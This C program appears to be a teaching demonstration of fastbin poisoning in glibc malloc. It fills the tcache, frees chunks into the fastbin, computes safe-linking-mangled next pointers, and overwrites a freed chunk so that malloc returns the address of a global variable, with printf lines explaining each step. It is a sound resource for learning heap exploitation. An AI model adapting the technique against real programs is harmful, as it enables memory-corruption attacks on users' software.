#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE 0x50

long target = 0xdeadbeef;

void main() {
    int i;
    long *tcache_chunks[7];
    long *fastbin_chunk0,
            *fastbin_chunk1,
            *fastbin_chunk2,
            *reallocated0,
            *reallocated1;

    long mangled_next0, mangled_next1;

    printf("So this time, our goal will be to get malloc to allocate a ptr to the global variable target at %p\n", &target);
    printf("Which has a value of 0x%lx\n", target);
    printf("We will be doing this, via editing the fastbin linked list.\n");
    printf("This will be similar to the tcache linked list pwn, however because of more checks, it is less practical.\n");
    printf("However since this used to be a super common technique, I wanted to include it.\n");
    printf("So we will start off with inserting three chunks into the fastbin.\n");
    printf("We will first need to fill up the corresponding tcache.\n\n");

    for (i = 0; i < 7; i++) {
        tcache_chunks[i] = malloc(CHUNK_SIZE);
    }

    fastbin_chunk0 = malloc(CHUNK_SIZE);
    fastbin_chunk1 = malloc(CHUNK_SIZE);
    fastbin_chunk2 = malloc(CHUNK_SIZE);


    malloc(CHUNK_SIZE);

    for (i = 0; i < 7; i++) {
        free(tcache_chunks[i]);
    }

    free(fastbin_chunk0);
    free(fastbin_chunk1);
    free(fastbin_chunk2);

    printf("Fastbin Chunk0:\t%p\n", fastbin_chunk0);
    printf("Fastbin Chunk1:\t%p\n", fastbin_chunk1);
    printf("Fastbin Chunk2:\t%p\n\n", fastbin_chunk2);

    printf("Now that we have chunks in the fastbin, let's prepare malloc to allocate a ptr to target.\n");
    printf("The tcache and fastbin linked lists operate in pretty similar ways.\n");
    printf("We will simply alter the next ptr of a fastbin chunk, such that the next chunk will be to where we want allocated.\n");
    printf("However, there is one complication.\n\n");

    printf("The tcache has a bin, for every possible size a fastbin chunk can be.\n");
    printf("Also malloc has a preference to use the tcache over the fastbin.\n");
    printf("As such, when we allocate a chunk from the fastbin, it will attempt to move over as many chunks as it can from the fastbin to the corresponding tcache.\n");
    printf("This adds a complication, since that means the 'fake' fastbin chunk we added, will also have to have a valid next ptr.\n");
    printf("And since there is similar next ptr mangling like with the tcache, we can't just put 0x00 there.\n\n");

    printf("So to summarize\n");
    printf("We will set the next ptr of the fastbin head chunk to point to 0x10 bytes before target (heap chunk header is 0x10 bytes).\n");
    printf("Then, we will set the next ptr of that fake heap chunk at target, to be '0x00' when it's mangled.\n");
    printf("Then, we will allocate a chunk from the fastbin. This will move the target chunk over to the tcache.\n");
    printf("The other two fastbin chunks will not be moved over because of the mangled null next ptr, and basically got removed from the fastbin.\n");
    printf("Then we will allocate a chunk from the tcache with our 'target' chunk, to get the allocated size.\n\n");

    mangled_next0 = (long)(((long)&target - 0x10) ^ ((long)fastbin_chunk2 >> 12));
    mangled_next1 = (long)(((long)0x00) ^ ((long)&target >> 12));

    printf("target mangled next ptr: ((%p - 0x10) ^ (%p >> 12)) = %p\n", &target, fastbin_chunk2, (long*)mangled_next0);
    printf("null mangled next ptr: ((0x00) ^ (%p >> 12)) = %p\n\n", &target, (long*)mangled_next1);

    *fastbin_chunk2 = mangled_next0;
    *((&target)-1) = 0x61;
    target = mangled_next1;

    for (i = 0; i < 7; i++) {
        tcache_chunks[i] = malloc(CHUNK_SIZE);
    }

    reallocated0 = malloc(CHUNK_SIZE);
    reallocated1 = malloc(CHUNK_SIZE);

    printf("Reallocated Ptr:\t%p\n", reallocated1);
    printf("Did we get target?\t%s\n", (reallocated1==&target) ? "True" : "False");
}
